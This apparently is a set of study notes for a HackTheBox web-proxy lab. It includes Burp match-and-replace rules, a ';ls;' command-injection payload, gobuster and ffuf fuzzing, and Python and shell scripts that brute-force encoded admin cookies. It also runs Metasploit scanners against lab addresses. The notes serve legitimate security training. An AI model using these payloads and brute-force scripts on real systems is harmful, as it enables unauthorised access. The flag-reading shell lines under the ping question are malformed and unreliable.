# *Using Web Proxies"

**Topics Covered:**

* Introduction of Cyber Security
* Offensive Security Intro
* SQL injections
* Command injections
* Upload bypass
* Authentication bypass
* XSS
* XXE
* Error handling
* Deserialization
* Automatic Response Modification

---

### Burp Match and Replace

**Setup:**

1. **Go to:** `Proxy > Proxy Settings > HTTP match and replace rules` → Click **Add**

2. **Settings:**

   * Type: `Request header` → Modify the request header
   * Match: `^User-Agent.*$` → Regex pattern matching entire User-Agent line
   * Replace: `User-Agent: HackTheBox Agent 1.0` → New value
   * Regex match: `True` → Use regex to match pattern

3. **Example modification of POST data:**

   * Change `ip` parameter from `1` → `;ls;`
   * Observe web application handling

```http
Type: Response body
Match: type="number"
Replace: type="text"
Regex match: False
```

```http
POST /ping HTTP/1.1
Host: 94.237.62.138:32306
Content-Length: 4
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://94.237.62.138:32306
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://94.237.62.138:32306/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

ip=1
```

**Question:** Intercept the ping request and change the POST data to read the flag:

```bash
ip='ls' > cat flag.txt > flag
find /* -name flag.txt > cat >flag
# Use request repeating to quickly test commands
```

---

**Question:** Decode the string in the attached file using multiple decoding steps:

```bash
unzip file
# Use CyberChef with recipe: 5× Base64, 1× URL Decode
# Retrieve flag
```

---

**Question:** Run `auxiliary/scanner/http/http_put` in Metasploit through Burp. What is the last line in the request?

```bash
msfconsole
use auxiliary/scanner/http/http_put
set PROXIES HTTP:127.0.0.1:8080
set RHOST SERVER_IP
set RPORT PORT
run
# View requests sent through Burp
```

---

**Directory enumeration and file discovery**

```bash
gobuster dir -u http://94.237.120.119:54649/ -w /usr/share/wordlists/dirb/common.txt -t 10 --timeout 20s
ffuf -u http://94.237.52.235:45524/admin/FUZZ.html -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -c -ac
curl -s http://94.237.52.235:45524/admin/2010.html | grep 'HTB{'
```

---

**Cookie-based MD5 fuzzing**

```bash
while read u; do echo -n $u | md5sum; done < /usr/share/seclists/Usernames/top-usernames-shortlist.txt | cut -d ' ' -f 1 > md5_users.txt

ffuf -u http://94.237.122.95:52820/skills/ \
-w md5_users.txt \
-b "cookie=FUZZ" \
-ac -v

curl -i http://94.237.122.95:52820/skills/ -b "cookie=084e0343a0486ff05530df6c705c8bb4"
```

---

**Enable button on `/lucky.php`**

* Right-click → Intercept → Modify response → Change `disabled` attribute → Forward request → Click button → View flag

---

**Decode multi-encoded cookie for `/admin.php`**

* Intercept → Copy cookie → Use CyberChef → Decode until 31-character value

---

**Fuzz last character of decoded cookie**

```python
import requests
import base64
import string

target = "http://94.237.120.74:52695/admin.php"
prefix = "3dac93b8cd250aa8c1a36fffc79a17a"
alphabet = string.ascii_letters + string.digits

for char in alphabet:
    full_hash = prefix + char
    b64_val = base64.b64encode(full_hash.encode()).decode()
    hex_val = b64_val.encode().hex()
    cookies = {'cookie': hex_val}
    r = requests.get(target, cookies=cookies)
    if len(r.content) != 1901:
        print(f"\n[+] SUCCESS! Character: {char}")
        print("-" * 30)
        print(r.text)
        print("-" * 30)
        break
    else:
        print(f"Testing: {char}", end="\r")
```

---

**Question:** Capture request from `auxiliary/scanner/http/coldfusion_locale_traversal` and find directory:

```bash
msfconsole
use auxiliary/scanner/http/coldfusion_locale_traversal
set PROXIES HTTP:127.0.0.1:8080
set RHOST 94.237.120.74
set RPORT 52695
run
# Intercept → directory found: '/CFIDE/administrator/index.cfm'
```

---